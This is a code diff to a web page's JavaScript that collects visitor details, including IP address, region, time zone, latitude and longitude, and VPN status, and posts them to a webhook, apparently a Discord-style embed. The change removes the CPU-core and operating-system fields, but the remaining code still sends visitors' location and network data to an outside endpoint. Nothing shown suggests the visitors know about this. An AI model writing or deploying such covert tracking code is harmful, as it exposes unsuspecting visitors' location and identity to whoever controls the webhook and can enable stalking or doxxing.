@@ -149,31 +149,6 @@
             const language = navigator.language;
             const screenWidth = window.screen.width;
             const screenHeight = window.screen.height;
-            const cpuCores = navigator.hardwareConcurrency || 'Unknown'; // Number of CPU cores
-
-            // Device info placeholders
-            let deviceEdition = 'Unknown';
-            let deviceVersion = 'Unknown';
-            let systemType = 'Unknown';
-
-            try {
-                // Fetch the Device Edition and Version
-                if (platform.includes('Win')) {
-                    deviceEdition = 'Windows';
-                    deviceVersion = navigator.appVersion;
-                } else if (platform.includes('Mac')) {
-                    deviceEdition = 'macOS';
-                    deviceVersion = navigator.appVersion;
-                } else if (platform.includes('Linux')) {
-                    deviceEdition = 'Linux';
-                    deviceVersion = navigator.appVersion;
-                }
-
-                // Fetch System Type (32-bit or 64-bit)
-                systemType = navigator.userAgent.indexOf('64') !== -1 ? '64-bit' : '32-bit';
-            } catch (error) {
-                console.error('Error fetching system data:', error);
-            }
 
             let ipAddress = 'Fetching...';
             let positionData = {
@@ -220,11 +195,7 @@
                 timezone: positionData.timezone,
                 latitude: positionData.latitude,
                 longitude: positionData.longitude,
-                vpn: positionData.vpn,
-                deviceEdition: deviceEdition,
-                deviceVersion: deviceVersion,
-                systemType: systemType,
-                cpuCores: cpuCores
+                vpn: positionData.vpn
             };
 
             // Try to fetch the custom device name from localStorage
@@ -254,7 +225,6 @@
                 <p><strong>Time Zone:</strong> ${deviceData.timezone}</p>
                 <p><strong>Coordinates:</strong> ${deviceData.latitude}, ${deviceData.longitude}</p>
                 <p><strong>VPN Detected:</strong> ${deviceData.vpn}</p>
-                <p><strong>CPU Cores:</strong> ${deviceData.cpuCores}</p>
             `;
 
             // Send the data to the webhook
@@ -282,8 +252,7 @@
                                 { name: 'Region', value: deviceData.region, inline: false },
                                 { name: 'Time Zone', value: deviceData.timezone, inline: false },
                                 { name: 'Coordinates', value: `${deviceData.latitude}, ${deviceData.longitude}`, inline: false },
-                                { name: 'VPN Detected', value: deviceData.vpn, inline: false },
-                                { name: 'CPU Cores', value: deviceData.cpuCores, inline: false }
+                                { name: 'VPN Detected', value: deviceData.vpn, inline: false }
                             ]
                         }]
                     })
